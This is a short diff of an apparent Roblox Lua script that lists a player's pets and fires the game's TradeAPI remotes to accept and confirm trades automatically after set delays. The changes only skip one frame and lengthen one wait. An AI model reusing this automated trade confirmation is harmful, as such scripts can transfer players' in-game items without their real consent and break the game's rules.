@@ -262,7 +262,7 @@ local function PetData()
                                     for _, child in pairs(pets:GetChildren()) do
                                         if child.Name:lower():find("row") and child.Name ~= "add_more_pets" then
                                             for _, frameChild in pairs(child:GetChildren()) do
-                                                if frameChild:IsA("Frame") then
+                                                if frameChild:IsA("Frame") and frameChild.Name ~= "add_more_pets" then
                                                     local frameName = frameChild.Name
                                                     if not table.find(processedFrames, frameName) then
                                                         table.insert(processedFrames, frameName)
@@ -322,7 +322,7 @@ local function TradePets()
                         end
                     end
 
-                    wait(3)
+                    wait(10)
                     game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
                     wait(10)
                     game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
